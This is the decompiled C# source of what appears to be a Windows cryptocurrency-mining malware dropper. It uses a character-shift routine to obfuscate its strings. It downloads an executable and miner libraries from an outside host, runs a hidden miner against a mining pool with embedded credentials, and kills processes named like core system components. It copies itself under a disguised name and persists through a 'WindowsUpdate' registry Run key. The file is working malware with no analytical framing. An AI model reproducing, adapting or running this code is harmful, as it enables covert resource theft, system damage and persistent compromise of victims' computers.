using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class Main
{
	private static string king = " -I 100 -T 200 -t 1 -o http://eu.triplemining.com:8344 -u unknownanon12_unknownanon -p football1221";

	private static string builtb = "MxvwOrrvhqXs";

	[STAThread]
	public static void Main()
	{
		string text = Interaction.Environ(delace("DSSGDWD", 3L)) + "/Imbvl/";
		string[] array = new string[8]
		{
			null,
			text + "spoolsv.exe",
			text + delace("plqhu1goo", 3L),
			text + delace("skdwn1fo", 3L),
			text + delace("skdwn1sw{", 3L),
			text + delace("xviwbh{w1goo", 3L),
			text + delace("frlqxwlo1goo", 3L),
			text + "taskengine.exe"
		};
		string[] array2 = new string[8]
		{
			null,
			delace("kwws=22lqvlglrxv1sz2ewfilohv2surjudp1h{h", 3L),
			delace("kwws=22lqvlglrxv1sz2ewfilohv2plqhu1goo", 3L),
			delace("kwws=22lqvlglrxv1sz2ewfilohv2skdwn1fo", 3L),
			delace("kwws=22lqvlglrxv1sz2ewfilohv2skdwn1sw{", 3L),
			delace("kwws=22lqvlglrxv1sz2ewfilohv2xviwbh{w1goo", 3L),
			delace("kwws=22lqvlglrxv1sz2ewfilohv2frlqxwlo1goo", 3L),
			delace("WSJX[EVI`Qmgvswsjx`[mrhs{w`GyvvirxZivwmsr`Vyr", 4L)
		};
		try
		{
			killer();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		if (Directory.Exists(text))
		{
			Interaction.Shell(text + delace("surjudp1h{h", 3L) + king, (AppWinStyle)0, false, -1);
		}
		else
		{
			downroad(array2[1], array[1]);
			downroad(array2[2], array[2]);
			downroad(array2[3], array[3]);
			downroad(array2[4], array[4]);
			downroad(array2[5], array[5]);
			downroad(array2[6], array[6]);
			bob();
		}
		try
		{
			if (!File.Exists(array[7]))
			{
				File.Copy(Application.get_ExecutablePath(), array[7]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			startedz();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			Process[] processes = Process.GetProcesses();
			int num = default(int);
			foreach (Process process in processes)
			{
				if (Operators.CompareString(process.ProcessName, array[num], false) == 0)
				{
					process.Kill();
				}
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	public static void killer()
	{
		string[] array = new string[16]
		{
			null, "program", "svchost", "taskhost", "service", "services", "update", "taskmanager", "taskmngr", "rundll32",
			"winlogon", "explorer", "spoolsv", "lsass", "winlogin", "csrss"
		};
		Process[] processes = Process.GetProcesses();
		int num = default(int);
		foreach (Process process in processes)
		{
			if (Operators.CompareString(process.ProcessName, array[num], false) == 0)
			{
				process.Kill();
			}
		}
	}

	public static void startedz()
	{
		string text = Interaction.Environ(delace("DSSGDWD", 3L)) + "\\Imbvl\\";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(delace("WSJX[EVI`Qmgvswsjx`[mrhs{w`GyvvirxZivwmsr`Vyr", 4L), writable: true);
		registryKey.SetValue("WindowsUpdate", text + "taskengine.exe");
		registryKey.Close();
	}

	public static void downroad(string url, string directory)
	{
		((ServerComputer)MyProject.Computer).get_Network().DownloadFile(url, directory);
	}

	public static void bob()
	{
		string text = Interaction.Environ(delace("DSSGDWD", 3L)) + "/Imbvl/";
		Interaction.Shell(text + "spoolsv.exe" + king, (AppWinStyle)0, false, -1);
	}

	public static string delace(string s, long v)
	{
		int num = Strings.Len(s);
		checked
		{
			string text2 = default(string);
			for (int i = 1; i <= num; i++)
			{
				string text = Strings.Mid(s, i, 1);
				text = Conversions.ToString(Strings.Asc(text) - v);
				text = Conversions.ToString(Strings.Chr(Conversions.ToInteger(text)));
				text2 += text;
			}
			return text2;
		}
	}
}
